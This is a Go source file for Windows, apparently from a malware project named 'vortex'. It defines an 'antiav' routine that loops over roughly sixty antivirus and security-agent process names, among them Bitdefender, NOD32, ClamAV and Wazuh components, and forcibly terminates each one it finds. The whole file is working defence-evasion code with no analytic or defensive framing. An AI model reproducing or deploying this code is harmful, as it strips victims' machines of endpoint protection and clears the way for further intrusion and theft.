//go:build windows

package antiav

import (
	"syscall"
	"time"
	"vortex/hutil"
)

func AvProcs() {
	procList := []string{
		"advchk", "ahnsd", "alertsvc", "alunotify", "autodown", "avmaisrv",
		"avpcc", "avpm", "avsched32", "avwupsrv", "bdmcon", "bdnagent",
		"bdoesrv", "bdss", "bdswitch", "bitdefender_p2p_startup", "cavrid",
		"cavtray", "cmgrdian", "doscan", "dvpapi", "frameworkservice",
		"frameworkservic", "freshclam", "icepack", "isafe", "mgavrtcl",
		"mghtml", "mgui", "navapsvc", "nod32krn", "nod32kui", "npfmntor",
		"nsmdtr", "ntrtscan", "ofcdog", "patch", "pav", "pcscan", "poproxy",
		"prevsrv", "realmon", "savscan", "sbserv", "scan32", "spider", "tmproxy",
		"trayicos", "updaterui", "updtnv28", "vet32", "vetmsg", "vptray", "vsserv",
		"webproxy", "webscanx", "xcommsvr", "wazuh-agent", "avgui",
	}

	for _, p := range procList {
		pId, _ := hutil.GetProcessIdByName(p)
		if pId != 0 {
			pHandle, _ := syscall.OpenProcess(syscall.PROCESS_TERMINATE, false, uint32(pId))
			_ = syscall.TerminateProcess(pHandle, 1)
		}
		time.Sleep(2 * time.Second)
	}
}
